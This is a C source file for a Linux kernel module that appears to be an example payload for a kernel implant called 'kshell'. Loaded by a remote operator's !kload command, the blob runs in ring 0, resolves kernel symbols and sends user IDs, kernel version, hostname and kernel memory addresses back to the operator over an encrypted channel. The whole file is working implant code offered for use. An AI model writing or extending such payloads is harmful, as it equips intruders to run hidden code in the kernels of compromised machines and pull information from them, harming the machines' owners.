/*
 * pic_hook.c — Example PIC blob that sends output back through kshell.
 *
 * When loaded via !kload, the blob receives a blob_ctx with:
 *   ctx->send(ctx, data, len) — send bytes to operator (encrypted)
 *   ctx->printf(ctx, fmt, ...) — formatted output to operator
 *   ctx->resolve(name)         — resolve kernel symbol by name
 *
 * This demo:
 *   1. Sends a greeting to the operator
 *   2. Reads current task info (we're in ring 0)
 *   3. Resolves and calls printk (to show resolve works)
 *   4. Sends system info back to the operator
 *   5. Returns — kthread exits, shell keeps running
 *
 * Build:
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 * Load via kshell:
 *   !kload pic_hook.bin
 *
 * Operator sees output in real time through the encrypted channel.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/utsname.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/mm.h>

#include "blob_ctx.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("PIC blob example — sends output through kshell");

static int __init pic_hook_init(void)
{
    /* This runs as a module init — for testing without kshell.
     * When loaded via !kload, _start (below) is called instead. */
    printk(KERN_INFO "pic_hook: loaded as module (use !kload for full demo)\n");
    return 0;
}

/*
 * _start — Blob entry point when loaded via !kload.
 *
 * Receives blob_ctx as first argument. All output goes back to the
 * operator through the encrypted channel.
 */
void _start(struct blob_ctx *ctx)
{
    typedef void (*printk_t)(const char *, ...);
    printk_t kprintk;

    /* Send greeting — operator sees this immediately */
    ctx->printf(ctx, "\n[blob] === PIC blob executing in ring 0 ===\n");
    ctx->printf(ctx, "[blob] PID: %d, comm: %s\n",
                current->pid, current->comm);
    ctx->printf(ctx, "[blob] uid: %d, euid: %d\n",
                from_kuid(&init_user_ns, current_uid()),
                from_kuid(&init_user_ns, current_euid()));

    /* Demonstrate symbol resolution */
    kprintk = (printk_t)ctx->resolve("printk");
    if (kprintk) {
        ctx->printf(ctx, "[blob] resolved printk → %px\n", kprintk);
        kprintk("pic_hook: hello from ring 0 (via resolved printk)\n");
        ctx->printf(ctx, "[blob] wrote to dmesg via resolved printk\n");
    }

    /* Read system info */
    ctx->printf(ctx, "[blob] kernel: %s %s\n",
                utsname()->sysname, utsname()->release);
    ctx->printf(ctx, "[blob] hostname: %s\n", utsname()->nodename);
    ctx->printf(ctx, "[blob] machine: %s\n", utsname()->machine);

    /* Show what we can access from ring 0 */
    ctx->printf(ctx, "[blob] current task_struct: %px\n", current);
    ctx->printf(ctx, "[blob] current mm: %px\n", current->mm);

    ctx->printf(ctx, "[blob] === blob complete, returning to shell ===\n\n");

    /* Return — kthread exits, shell stays alive */
}

static void __exit pic_hook_exit(void) {}

module_init(pic_hook_init);
module_exit(pic_hook_exit);
